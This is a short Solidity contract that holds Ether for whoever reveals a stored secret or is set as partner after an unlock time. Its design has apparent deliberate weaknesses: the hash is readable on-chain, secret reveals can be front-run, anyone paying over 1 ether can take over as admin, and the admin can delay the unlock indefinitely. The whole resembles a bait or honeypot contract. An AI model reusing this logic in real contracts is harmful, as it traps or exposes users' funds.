pragma solidity ^0.4.24;

contract Oxbb63f4727de0dfd7cafa7c93cb2dae0578e11539 {
    bytes32 private secretHash;
    
    struct AdminData {
        address partner;
        address admin;
        uint256 unlockTime;
        bool locked;
    }
    
    AdminData private adminData = AdminData(address(0), address(0), 0, false);
    
    function claimWithSecret(bytes secret) external payable {
        if (secretHash == keccak256(secret) && now > adminData.unlockTime) {
            msg.sender.transfer(this.balance);
        }
    }
    
    function claim() public payable {
        if (msg.sender == adminData.partner && now > adminData.unlockTime) {
            msg.sender.transfer(this.balance);
        }
    }
    
    function computeHash(bytes data) public pure returns (bytes32) {
        return keccak256(data);
    }
    
    function setSecretHash(bytes32 newSecretHash) public payable {
        if ((!adminData.locked && (msg.value > 1 ether)) || secretHash == 0x00) {
            secretHash = newSecretHash;
            adminData.admin = msg.sender;
            adminData.unlockTime = now;
        }
    }
    
    function setUnlockTime(uint newUnlockTime) public {
        if (msg.sender == adminData.admin) {
            adminData.unlockTime = newUnlockTime;
        }
    }
    
    function setPartner(address newPartner) public {
        if (msg.sender == adminData.admin) {
            adminData.partner = newPartner;
        }
    }
    
    function lockContract(bytes32 providedSecretHash) public {
        if (providedSecretHash == secretHash && msg.sender == adminData.admin) {
            adminData.locked = true;
        }
    }
    
    function() public payable {}
}